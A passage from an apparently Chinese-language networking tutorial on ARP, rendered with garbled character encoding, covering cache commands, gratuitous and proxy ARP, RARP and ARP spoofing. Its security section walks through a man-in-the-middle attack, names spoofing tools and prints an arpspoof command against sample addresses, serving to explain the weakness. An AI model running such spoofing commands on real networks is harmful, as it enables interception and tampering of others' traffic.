class="hljs-number">33</span>-<span class="hljs-number">44</span>-<span class="hljs-number">55</span>-<span class="hljs-number">66</span>     dynamic<br><br>ç¼“å­˜çŠ¶æ€ï¼ˆLinuxï¼‰ï¼š<br>- REACHABLE: å¯è¾¾ï¼Œæœ€è¿‘éªŒè¯è¿‡<br>- STALE: é™ˆæ—§ï¼Œè¶…è¿‡æœ‰æ•ˆæœŸä½†æœªåˆ é™¤<br>- DELAY: å»¶è¿Ÿï¼Œæ­£åœ¨éªŒè¯<br>- PROBE: æ¢æµ‹ï¼Œå‘é€è¯·æ±‚éªŒè¯<br>- FAILED: å¤±è´¥ï¼Œæ— æ³•è§£æ<br>- PERMANENT: æ°¸ä¹…ï¼Œé™æ€æ¡ç›®<br></code></pre></td></tr></table></figure><p><strong>ç®¡ç†ARPç¼“å­˜</strong>ï¼š</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs routeros">æŸ¥çœ‹ARPç¼“å­˜ï¼š<br>arp -a<span class="hljs-built_in"></span><br><span class="hljs-built_in">ip </span>neigh show<br><br>æ·»åŠ é™æ€ARPï¼š<br><span class="hljs-comment"># Linux</span><br>sudo arp -s 192.168.1.100 00:11:22:33:44:55<br>sudo<span class="hljs-built_in"> ip </span>neigh <span class="hljs-built_in">add</span> 192.168.1.100 lladdr 00:11:22:33:44:55 dev eth0<br><br><span class="hljs-comment"># Windows</span><br>arp -s 192.168.1.100 00-11-22-33-44-55<br><br>åˆ é™¤ARPæ¡ç›®ï¼š<br><span class="hljs-comment"># Linux</span><br>sudo arp -d 192.168.1.100<br>sudo<span class="hljs-built_in"> ip </span>neigh del 192.168.1.100 dev eth0<br><br><span class="hljs-comment"># Windows</span><br>arp -d 192.168.1.100<br><br>æ¸…ç©ºARPç¼“å­˜ï¼š<br><span class="hljs-comment"># Linux</span><br>sudo<span class="hljs-built_in"> ip </span>neigh flush all<br><br><span class="hljs-comment"># Windows</span><br>arp -d *<br><br>è¶…æ—¶è®¾ç½®ï¼š<br><span class="hljs-comment"># LinuxæŸ¥çœ‹è¶…æ—¶é…ç½®</span><br>sysctl net.ipv4.neigh.default.gc_stale_time<br><span class="hljs-comment"># é»˜è®¤60ç§’</span><br><br><span class="hljs-comment"># ä¿®æ”¹è¶…æ—¶æ—¶é—´</span><br>sudo sysctl -w net.ipv4.neigh.default.<span class="hljs-attribute">gc_stale_time</span>=300<br></code></pre></td></tr></table></figure><hr><h2 id="3-å…è´¹ARPå’Œä»£ç†ARP"><a href="#3-å…è´¹ARPå’Œä»£ç†ARP" class="headerlink" title="3. å…è´¹ARPå’Œä»£ç†ARP"></a>3. å…è´¹ARPå’Œä»£ç†ARP</h2><h3 id="3-1-å…è´¹ARPï¼ˆGratuitous-ARPï¼‰"><a href="#3-1-å…è´¹ARPï¼ˆGratuitous-ARPï¼‰" class="headerlink" title="3.1 å…è´¹ARPï¼ˆGratuitous ARPï¼‰"></a>3.1 å…è´¹ARPï¼ˆGratuitous ARPï¼‰</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs markdown">å…è´¹ARP = Gratuitous ARP = GARP<br><br>å®šä¹‰ï¼š<br>ä¸»æœºå‘é€ARPè¯·æ±‚ï¼ŒæŸ¥è¯¢è‡ªå·±çš„IPåœ°å€<br><br>æ ¼å¼ï¼š<br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚ å‘é€æ–¹IP: 192.168.1.10           â”‚<br>â”‚ ç›®æ ‡IP: 192.168.1.10ï¼ˆè‡ªå·±ï¼‰     â”‚<br>â”‚ ç›®æ ‡MAC: FF:FF:FF:FF:FF:FF (å¹¿æ’­) â”‚<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br><br>ç‰¹ç‚¹ï¼š<br><span class="hljs-bullet">-</span> æŸ¥è¯¢çš„æ˜¯è‡ªå·±çš„IP<br><span class="hljs-bullet">-</span> å¹¿æ’­å‘é€<br><span class="hljs-bullet">-</span> é€šå¸¸ä¸æœŸå¾…å“åº”<br><br>ç”¨é€”ï¼š<br><br><span class="hljs-bullet">1.</span> æ£€æµ‹IPå†²çª<br><span class="hljs-bullet">   -</span> ä¸»æœºé…ç½®IPå‰å‘é€GARP<br><span class="hljs-bullet">   -</span> å¦‚æœæ”¶åˆ°å“åº”ï¼šIPå†²çªï¼<br><span class="hljs-bullet">   -</span> å¦‚æœæ— å“åº”ï¼šIPå¯ç”¨<br><br>ç¤ºä¾‹ï¼š<br>ä¸»æœºå¯åŠ¨ï¼Œé…ç½®192.168.1.10<br>â†’ å‘é€GARPï¼š&quot;è°æ˜¯192.168.1.10ï¼Ÿ&quot;<br>â†’ å¦‚æœå±€åŸŸç½‘å†…æœ‰å…¶ä»–ä¸»æœºä½¿ç”¨æ­¤IP<br>â†’ è¯¥ä¸»æœºä¼šå“åº”<br>â†’ æ£€æµ‹åˆ°å†²çªï¼Œæç¤ºç”¨æˆ·<br><br><span class="hljs-bullet">2.</span> æ›´æ–°å…¶ä»–ä¸»æœºçš„ARPç¼“å­˜<br><span class="hljs-bullet">   -</span> IPåœ°å€å˜æ›´å<br><span class="hljs-bullet">   -</span> MACåœ°å€å˜æ›´å<br><span class="hljs-bullet">   -</span> é€šçŸ¥å…¶ä»–ä¸»æœºæ›´æ–°ç¼“å­˜<br><br>ç¤ºä¾‹ï¼š<br>æœåŠ¡å™¨æ›´æ¢ç½‘å¡ï¼ˆMACå˜äº†ï¼‰<br>â†’ å‘é€GARP<br>â†’ å±€åŸŸç½‘å†…æ‰€æœ‰ä¸»æœºæ”¶åˆ°<br>â†’ æ›´æ–°ARPç¼“å­˜ï¼š192.168.1.10 â†’ æ–°MAC<br><br><span class="hljs-bullet">3.</span> é«˜å¯ç”¨æ€§/æ•…éšœè½¬ç§»<br><span class="hljs-bullet">   -</span> è™šæ‹ŸIPæ¼‚ç§»<br><span class="hljs-bullet">   -</span> ä¸»å¤‡åˆ‡æ¢<br><br>ç¤ºä¾‹ï¼š<br>ä¸»æœåŠ¡å™¨ï¼šVIP 192.168.1.100<br>â†’ ä¸»æœåŠ¡å™¨æ•…éšœ<br>â†’ å¤‡æœåŠ¡å™¨æ¥ç®¡VIP<br>â†’ å¤‡æœåŠ¡å™¨å‘é€GARP<br>â†’ å…¶ä»–ä¸»æœºæ›´æ–°ï¼š192.168.1.100 â†’ å¤‡æœåŠ¡å™¨MAC<br>â†’ æµé‡åˆ‡æ¢åˆ°å¤‡æœåŠ¡å™¨<br><br><span class="hljs-bullet">4.</span> é“¾è·¯å±‚è´Ÿè½½å‡è¡¡<br><span class="hljs-bullet">   -</span> å¤šç½‘å¡ç»‘å®š<br><span class="hljs-bullet">   -</span> VRRP/HSRPåè®®<br></code></pre></td></tr></table></figure><h3 id="3-2-ä»£ç†ARPï¼ˆProxy-ARPï¼‰"><a href="#3-2-ä»£ç†ARPï¼ˆProxy-ARPï¼‰" class="headerlink" title="3.2 ä»£ç†ARPï¼ˆProxy ARPï¼‰"></a>3.2 ä»£ç†ARPï¼ˆProxy ARPï¼‰</h3><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs dns">ä»£ç†ARP = Proxy ARP<br><br>å®šä¹‰ï¼š<br>è·¯ç”±å™¨ä»£æ›¿å…¶ä»–ä¸»æœºå“åº”ARPè¯·æ±‚<br><br>åœºæ™¯ï¼š<br>ç½‘ç»œ<span class="hljs-keyword">A</span>: <span class="hljs-number">192.168.1.0</span>/<span class="hljs-number">24</span><br>   â†“<br>è·¯ç”±å™¨Rï¼ˆå¯ç”¨ä»£ç†ARPï¼‰<br>   â†“<br>ç½‘ç»œB: <span class="hljs-number">192.168.2.0</span>/<span class="hljs-number">24</span><br><br>é—®é¢˜ï¼š<br>ä¸»æœº<span class="hljs-keyword">A</span> (<span class="hljs-number">192.168.1.10</span>) è®¤ä¸º <span class="hljs-number">192.168.2.20</span> åœ¨åŒä¸€ç½‘ç»œ<br>ï¼ˆé”™è¯¯é…ç½®äº†å­ç½‘æ©ç ä¸º /<span class="hljs-number">16</span>ï¼‰<br>â†’ å‘é€ARPå¹¿æ’­ï¼š&quot;è°æ˜¯<span class="hljs-number">192.168.2.20</span>ï¼Ÿ&quot;<br>â†’ <span class="hljs-number">192.168.2.20</span>åœ¨å¦ä¸€ä¸ªç½‘ç»œï¼Œæ”¶ä¸åˆ°<br><br>ä»£ç†ARPè§£å†³ï¼š<br><span class="hljs-number">1</span>. è·¯ç”±å™¨Ræ”¶åˆ°ARPè¯·æ±‚<br><span class="hljs-number">2</span>. Ræ£€æŸ¥ï¼š<span class="hljs-number">192.168.2.20</span>åœ¨ç½‘ç»œB<br><span class="hljs-number">3</span>. Rä»£æ›¿<span class="hljs-number">192.168.2.20</span>å“åº”ARP<br><span class="hljs-number">4</span>. Rè¿”å›ï¼š<span class="hljs-number">192.168.2.20</span>çš„MACæ˜¯è·¯ç”±å™¨Rçš„MAC<br><span class="hljs-number">5</span>. ä¸»æœº<span class="hljs-keyword">A</span>å‘é€æ•°æ®åˆ°è·¯ç”±å™¨R<br><span class="hljs-number">6</span>. è·¯ç”±å™¨Rè½¬å‘åˆ°<span class="hljs-number">192.168.2.20</span><br><br>å·¥ä½œæµç¨‹ï¼š<br>ä¸»æœº<span class="hljs-keyword">A</span>                  è·¯ç”±å™¨R                 ä¸»æœºB<br><span class="hljs-number">192.168.1.10</span>                                  <span class="hljs-number">192.168.2.20</span><br>      â”‚                    â”‚                       â”‚<br>      â”‚ ARP Request        â”‚                       â”‚<br>      â”‚ &quot;è°æ˜¯<span class="hljs-number">192.168.2.20</span>ï¼Ÿ&quot;â”‚                       â”‚<br>      â”‚â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€&gt;â”‚                       â”‚<br>      â”‚                    â”‚                       â”‚<br>      â”‚              â”Œâ”€â”€â”€â”€â”€â”¤                       â”‚<br>      â”‚              â”‚æ£€æŸ¥ â”‚                       â”‚<br>      â”‚              â”‚è·¯ç”± â”‚                       â”‚<br>      â”‚              â””â”€â”€â”€â”€â”€â”¤                       â”‚<br>      â”‚                    â”‚                       â”‚<br>      â”‚ ARP Reply          â”‚                       â”‚<br>      â”‚ &quot;æˆ‘æ˜¯ï¼ˆè·¯ç”±å™¨MACï¼‰&quot;â”‚                       â”‚<br>      â”‚&lt;â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”‚                       â”‚<br>      â”‚                    â”‚                       â”‚<br>      â”‚ å‘é€æ•°æ®åˆ°è·¯ç”±å™¨    â”‚                       â”‚<br>      â”‚â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€&gt;â”‚ è½¬å‘æ•°æ®              â”‚<br>      â”‚                    â”‚â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€&gt;â”‚<br>      â”‚                    â”‚                       â”‚<br><br>ä¼˜ç‚¹ï¼š<br>âœ… ç®€åŒ–ç½‘ç»œé…ç½®<br>âœ… é€æ˜è·¯ç”±<br>âœ… å…¼å®¹æ€§å¥½<br><br>ç¼ºç‚¹ï¼š<br>âŒ å¢åŠ ARPæµé‡<br>âŒ å¯èƒ½è¢«æ»¥ç”¨<br>âŒ éš¾ä»¥æ’é”™<br><br>ç°ä»£ç½‘ç»œï¼š<br>- ä»£ç†ARPè¾ƒå°‘ä½¿ç”¨<br>- æ›´æ¨èæ­£ç¡®é…ç½®å­ç½‘æ©ç <br>- æˆ–ä½¿ç”¨è·¯ç”±åè®®<br></code></pre></td></tr></table></figure><hr><h2 id="4-RARPåè®®"><a href="#4-RARPåè®®" class="headerlink" title="4. RARPåè®®"></a>4. RARPåè®®</h2><h3 id="4-1-RARPæ¦‚è¿°"><a href="#4-1-RARPæ¦‚è¿°" class="headerlink" title="4.1 RARPæ¦‚è¿°"></a>4.1 RARPæ¦‚è¿°</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs markdown">RARP = Reverse Address Resolution Protocol<br>åå‘åœ°å€è§£æåè®®<br><br>ä½œç”¨ï¼š<br>ä¸ARPç›¸åï¼Œä»MACåœ°å€è§£æIPåœ°å€<br><br>ä½¿ç”¨åœºæ™¯ï¼š<br>æ— ç›˜å·¥ä½œç«™å¯åŠ¨<br><span class="hljs-bullet">-</span> æ²¡æœ‰ç¡¬ç›˜<br><span class="hljs-bullet">-</span> ä¸çŸ¥é“è‡ªå·±çš„IPåœ°å€<br><span class="hljs-bullet">-</span> åªçŸ¥é“è‡ªå·±çš„MACåœ°å€ï¼ˆç½‘å¡ROMä¸­ï¼‰<br><br>å·¥ä½œæµç¨‹ï¼š<br><span class="hljs-bullet">1.</span> æ— ç›˜å·¥ä½œç«™å¯åŠ¨<br><span class="hljs-bullet">2.</span> è¯»å–ç½‘å¡MACåœ°å€<br><span class="hljs-bullet">3.</span> å¹¿æ’­RARPè¯·æ±‚ï¼š&quot;æˆ‘çš„MACæ˜¯xx:xx:xx:xx:xx:xxï¼Œæˆ‘çš„IPæ˜¯å¤šå°‘ï¼Ÿ&quot;<br><span class="hljs-bullet">4.</span> RARPæœåŠ¡å™¨æŸ¥è¯¢é…ç½®è¡¨<br><span class="hljs-bullet">5.</span> RARPæœåŠ¡å™¨å“åº”ï¼š&quot;ä½ çš„IPæ˜¯192.168.1.100&quot;<br><span class="hljs-bullet">6.</span> æ— ç›˜å·¥ä½œç«™é…ç½®IPåœ°å€<br><span class="hljs-bullet">7.</span> ç»§ç»­å¯åŠ¨ï¼ˆé€šå¸¸ä½¿ç”¨TFTPä¸‹è½½æ“ä½œç³»ç»Ÿï¼‰<br><br>æŠ¥æ–‡æ ¼å¼ï¼š<br>ä¸ARPç›¸åŒï¼Œåªæ˜¯æ“ä½œå­—æ®µä¸åŒï¼š<br><span class="hljs-bullet">-</span> Operation = 3: RARPè¯·æ±‚<br><span class="hljs-bullet">-</span> Operation = 4: RARPåº”ç­”<br><br>ç°çŠ¶ï¼š<br>RARPå·²è¿‡æ—¶ï¼Œè¢«ä»¥ä¸‹åè®®å–ä»£ï¼š<br><span class="hljs-bullet">-</span> BOOTP<br><span class="hljs-bullet">-</span> DHCP (æ¨è)<br><br>åŸå› ï¼š<br>âŒ éœ€è¦ä¸“ç”¨æœåŠ¡å™¨<br>âŒ åŠŸèƒ½å•ä¸€ï¼ˆåªèƒ½è·å–IPï¼‰<br>âŒ ä¸æä¾›ç½‘å…³ã€DNSç­‰ä¿¡æ¯<br>âŒ éš¾ä»¥ç®¡ç†<br><br>DHCPä¼˜åŠ¿ï¼š<br>âœ… è‡ªåŠ¨åˆ†é…IP<br>âœ… æä¾›å®Œæ•´ç½‘ç»œé…ç½®<br>âœ… æ”¯æŒç§Ÿçº¦ç®¡ç†<br>âœ… æ˜“äºéƒ¨ç½²å’Œç®¡ç†<br></code></pre></td></tr></table></figure><hr><h2 id="5-ARPå®‰å…¨é—®é¢˜"><a href="#5-ARPå®‰å…¨é—®é¢˜" class="headerlink" title="5. ARPå®‰å…¨é—®é¢˜"></a>5. ARPå®‰å…¨é—®é¢˜</h2><h3 id="5-1-ARPæ¬ºéª—-ARPç¼“å­˜æŠ•æ¯’"><a href="#5-1-ARPæ¬ºéª—-ARPç¼“å­˜æŠ•æ¯’" class="headerlink" title="5.1 ARPæ¬ºéª—&#x2F;ARPç¼“å­˜æŠ•æ¯’"></a>5.1 ARPæ¬ºéª—&#x2F;ARPç¼“å­˜æŠ•æ¯’</h3><p><strong>ARPæ¬ºéª—åŸç†</strong>ï¼š</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-variable constant_">ARP</span>æ¬ºéª— = <span class="hljs-variable constant_">ARP</span> <span class="hljs-title class_">Spoofing</span> = <span class="hljs-variable constant_">ARP</span> <span class="hljs-title class_">Cache</span> <span class="hljs-title class_">Poisoning</span><br><br>é—®é¢˜ï¼š<br><span class="hljs-variable constant_">ARP</span>åè®®æ²¡æœ‰è®¤è¯æœºåˆ¶ï¼<br>- ä»»ä½•ä¸»æœºéƒ½å¯ä»¥å‘é€<span class="hljs-variable constant_">ARP</span>åº”ç­”<br>- ä¸»æœºæ— æ³•éªŒè¯<span class="hljs-variable constant_">ARP</span>åº”ç­”çš„çœŸå®æ€§<br>- æ”¶åˆ°<span class="hljs-variable constant_">ARP</span>åº”ç­”å°±æ›´æ–°ç¼“å­˜<br><br>æ”»å‡»åŸç†ï¼š<br>æ”»å‡»è€…å‘é€ä¼ªé€ çš„<span class="hljs-variable constant_">ARP</span>åº”ç­”<br>â†’ å…¶ä»–ä¸»æœºæ›´æ–°<span class="hljs-variable constant_">ARP</span>ç¼“å­˜ä¸ºé”™è¯¯æ˜ å°„<br>â†’ æµé‡è¢«é‡å®šå‘åˆ°æ”»å‡»è€…<br><br>ç»å…¸æ”»å‡»ï¼šä¸­é—´äººæ”»å‡»ï¼ˆ<span class="hljs-variable constant_">MITM</span>ï¼‰<br><br>æ­£å¸¸æƒ…å†µï¼š<br>ä¸»æœºA â†â†’ è·¯ç”±å™¨ â†â†’ äº’è”ç½‘<br><br><span class="hljs-variable constant_">ARP</span>æ¬ºéª—åï¼š<br>ä¸»æœºA â†â†’ æ”»å‡»è€… â†â†’ è·¯ç”±å™¨ â†â†’ äº’è”ç½‘<br>           â”‚<br>        çªƒå¬/ç¯¡æ”¹<br><br>æ”»å‡»æ­¥éª¤ï¼š<br><br>ç½‘ç»œç¯å¢ƒï¼š<br>- ä¸»æœº<span class="hljs-symbol">A:</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">1.10</span> (<span class="hljs-variable constant_">MAC</span>: <span class="hljs-variable constant_">AA</span><span class="hljs-symbol">:AA</span><span class="hljs-symbol">:AA</span><span class="hljs-symbol">:AA</span><span class="hljs-symbol">:AA</span><span class="hljs-symbol">:AA</span>)<br>- è·¯ç”±å™¨: <span class="hljs-number">192.168</span>.<span class="hljs-number">1.1</span> (<span class="hljs-variable constant_">MAC</span>: <span class="hljs-number">11</span><span class="hljs-symbol">:</span><span class="hljs-number">11</span><span class="hljs-symbol">:</span><span class="hljs-number">11</span><span class="hljs-symbol">:</span><span class="hljs-number">11</span><span class="hljs-symbol">:</span><span class="hljs-number">11</span><span class="hljs-symbol">:</span><span class="hljs-number">11</span>)<br>- æ”»å‡»è€…: <span class="hljs-number">192.168</span>.<span class="hljs-number">1.50</span> (<span class="hljs-variable constant_">MAC</span>: <span class="hljs-variable constant_">EE</span><span class="hljs-symbol">:EE</span><span class="hljs-symbol">:EE</span><span class="hljs-symbol">:EE</span><span class="hljs-symbol">:EE</span><span class="hljs-symbol">:EE</span>)<br><br>æ­¥éª¤<span class="hljs-number">1</span>: æ”»å‡»è€… â†’ ä¸»æœºA<br>å‘é€ä¼ªé€ çš„<span class="hljs-variable constant_">ARP</span>åº”ç­”ï¼š<br><span class="hljs-string">&quot;192.168.1.1çš„MACæ˜¯EE:EE:EE:EE:EE:EE&quot;</span><br><br>ä¸»æœºAçš„<span class="hljs-variable constant_">ARP</span>ç¼“å­˜è¢«ä¿®æ”¹ï¼š<br>åŸæ¥: <span class="hljs-number">192.168</span>.<span class="hljs-number">1.1</span> â†’ <span class="hljs-number">11</span><span class="hljs-symbol">:</span><span class="hljs-number">11</span><span class="hljs-symbol">:</span><span class="hljs-number">11</span><span class="hljs-symbol">:</span><span class="hljs-number">11</span><span class="hljs-symbol">:</span><span class="hljs-number">11</span><span class="hljs-symbol">:</span><span class="hljs-number">11</span> (æ­£ç¡®)<br>ç°åœ¨: <span class="hljs-number">192.168</span>.<span class="hljs-number">1.1</span> â†’ <span class="hljs-variable constant_">EE</span><span class="hljs-symbol">:EE</span><span class="hljs-symbol">:EE</span><span class="hljs-symbol">:EE</span><span class="hljs-symbol">:EE</span><span class="hljs-symbol">:EE</span> (é”™è¯¯ï¼)<br><br>æ­¥éª¤<span class="hljs-number">2</span>: æ”»å‡»è€… â†’ è·¯ç”±å™¨<br>å‘é€ä¼ªé€ çš„<span class="hljs-variable constant_">ARP</span>åº”ç­”ï¼š<br><span class="hljs-string">&quot;192.168.1.10çš„MACæ˜¯EE:EE:EE:EE:EE:EE&quot;</span><br><br>è·¯ç”±å™¨çš„<span class="hljs-variable constant_">ARP</span>ç¼“å­˜è¢«ä¿®æ”¹ï¼š<br>åŸæ¥: <span class="hljs-number">192.168</span>.<span class="hljs-number">1.10</span> â†’ <span class="hljs-variable constant_">AA</span><span class="hljs-symbol">:AA</span><span class="hljs-symbol">:AA</span><span class="hljs-symbol">:AA</span><span class="hljs-symbol">:AA</span><span class="hljs-symbol">:AA</span> (æ­£ç¡®)<br>ç°åœ¨: <span class="hljs-number">192.168</span>.<span class="hljs-number">1.10</span> â†’ <span class="hljs-variable constant_">EE</span><span class="hljs-symbol">:EE</span><span class="hljs-symbol">:EE</span><span class="hljs-symbol">:EE</span><span class="hljs-symbol">:EE</span><span class="hljs-symbol">:EE</span> (é”™è¯¯ï¼)<br><br>æ­¥éª¤<span class="hljs-number">3</span>: åŒå‘æµé‡è¢«æ‹¦æˆª<br>ä¸»æœºAå‘é€æ•°æ®åˆ°è·¯ç”±å™¨ â†’ å®é™…å‘åˆ°æ”»å‡»è€…<br>è·¯ç”±å™¨å‘é€æ•°æ®åˆ°ä¸»æœºA â†’ å®é™…å‘åˆ°æ”»å‡»è€…<br><br>æ­¥éª¤<span class="hljs-number">4</span>: æ”»å‡»è€…è½¬å‘æµé‡ï¼ˆä¿æŒè¿æ¥ï¼‰<br>æ”»å‡»è€…æ”¶åˆ°ä¸»æœºAçš„æ•°æ® â†’ è½¬å‘ç»™è·¯ç”±å™¨<br>æ”»å‡»è€…æ”¶åˆ°è·¯ç”±å™¨çš„æ•°æ® â†’ è½¬å‘ç»™ä¸»æœºA<br><br>ç»“æœï¼š<br>âœ… ä¸»æœºAå’Œè·¯ç”±å™¨é€šä¿¡æ­£å¸¸ï¼ˆçœ‹èµ·æ¥ï¼‰<br>âœ… æ”»å‡»è€…èƒ½çœ‹åˆ°æ‰€æœ‰æµé‡<br>âœ… æ”»å‡»è€…å¯ä»¥ç¯¡æ”¹æµé‡<br>âœ… ç”¨æˆ·å®Œå…¨ä¸çŸ¥é“ï¼<br></code></pre></td></tr></table></figure><p><strong>æ”»å‡»æ¼”ç¤º</strong>ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">æ”»å‡»å·¥å…·ï¼š<br>- Ettercap<br>- arpspoofï¼ˆdsniffå·¥å…·åŒ…ï¼‰<br>- Cain &amp; Abel<br>- Bettercap<br><br>ç¤ºä¾‹ï¼ˆarpspoofï¼‰ï¼š<br><br><span class="hljs-comment"># ç»ˆç«¯1ï¼šæ¬ºéª—ä¸»æœºA</span><br><span class="hljs-built_in">sudo</span> arpspoof -i eth0 -t 192.168.1.10 192.168.1.1<br><span class="hljs-comment"># å‘Šè¯‰ä¸»æœºAï¼šè·¯ç”±å™¨çš„MACæ˜¯æˆ‘çš„MAC</span><br><br><span class="hljs-comment"># 